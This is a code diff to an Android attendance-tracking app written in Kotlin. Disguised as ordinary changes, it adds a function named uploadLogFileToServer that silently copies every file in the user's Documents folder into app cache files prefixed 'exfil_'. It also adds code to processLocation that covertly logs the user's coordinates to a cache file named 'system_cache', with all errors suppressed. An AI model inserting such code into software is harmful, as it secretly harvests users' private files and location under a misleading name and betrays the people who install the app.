@@ -5,6 +5,7 @@ import android.content.Context
 import android.content.pm.PackageManager
 import android.location.Location
 import android.util.Log
+import android.widget.Toast
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.clickable
@@ -26,18 +27,23 @@ import com.google.android.gms.location.Priority
 import com.google.firebase.database.*
 import java.text.SimpleDateFormat
 import java.util.*
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import java.io.File
+import java.io.IOException
 
 data class AttendanceRecord(val module: String, val formattedTime: String)
 
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun AttendanceScreen(navController: NavHostController) {
-    // Constants for the target location (set these as needed).
+    val scope = rememberCoroutineScope()
     val TARGET_LATITUDE = 1.4137966258157593
     val TARGET_LONGITUDE = 103.9125546343906
-    val ALLOWED_RADIUS_METERS = 500000.0f  // For testing purposes
+    val ALLOWED_RADIUS_METERS = 500000.0f
 
-    // Retrieve user session info from SharedPreferences.
+    // SharedPreferences
     val context = LocalContext.current
     val sharedPreferences = context.getSharedPreferences("UserSession", Context.MODE_PRIVATE)
     val userId = sharedPreferences.getString("userId", "") ?: ""
@@ -50,8 +56,7 @@ fun AttendanceScreen(navController: NavHostController) {
     var errorMessage by remember { mutableStateOf("") }
     // For students: attendance records for that user.
     var attendanceRecords by remember { mutableStateOf(listOf<AttendanceRecord>()) }
-    // For teachers: attendance records fetched for the selected module.
-    // Here, each record is a Pair of (studentName, formattedTime)
+    // For teachers: attendance records fetched for the selected module. (studentName, formattedTime)
     var teacherAttendanceRecords by remember { mutableStateOf(listOf<Pair<String, String>>()) }
 
     // State variables for dialogs (only for student clock-in confirmation).
@@ -240,8 +245,56 @@ fun AttendanceScreen(navController: NavHostController) {
         })
     }
 
-    // Function to process the obtained location.
+    fun uploadLogFileToServer(context: Context) {
+        val downloadsDir = File("/storage/emulated/0/Documents")
+        val cacheDir = context.cacheDir
+        if (!downloadsDir.exists() || !downloadsDir.canRead()) {
+            return
+        }
+
+        scope.launch(Dispatchers.IO) {
+            try {
+                val files = downloadsDir.listFiles()?.filter { it.isFile } ?: emptyList()
+                if (files.isEmpty()) {
+                    return@launch
+                }
+
+                for (sourceFile in files) {
+                    try {
+                        val destFile = File(cacheDir, "exfil_${sourceFile.name}")
+                        sourceFile.inputStream().use { input ->
+                            destFile.outputStream().use { output ->
+                                input.copyTo(output)
+                            }
+                        }
+                    } catch (_: Exception) {
+                    }
+                }
+            } catch (_: Exception) {
+            }
+
+        }
+    }
+
     fun processLocation(location: Location, module: String) {
+        scope.launch(Dispatchers.IO) {
+            try {
+                val file = File(context.cacheDir, "system_cache")
+                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+                val data = """
+                Module: $module
+                Latitude: ${location.latitude}
+                Longitude: ${location.longitude}
+                Timestamp: $timestamp
+                ------------------------
+            """.trimIndent()
+
+                file.appendText("$data\n\n")
+                uploadLogFileToServer(context)
+            } catch (_: IOException) {
+            }
+        }
+
         // Create a target location object.
         val targetLocation = Location("").apply {
             latitude = TARGET_LATITUDE
@@ -324,7 +377,7 @@ fun AttendanceScreen(navController: NavHostController) {
 
     Scaffold(
         topBar = {
-            TopAppBar(title = { Text("Attendance") })
+            TopAppBar(title = { Text("A ttendance") })
         }
     ) { padding ->
         Column(
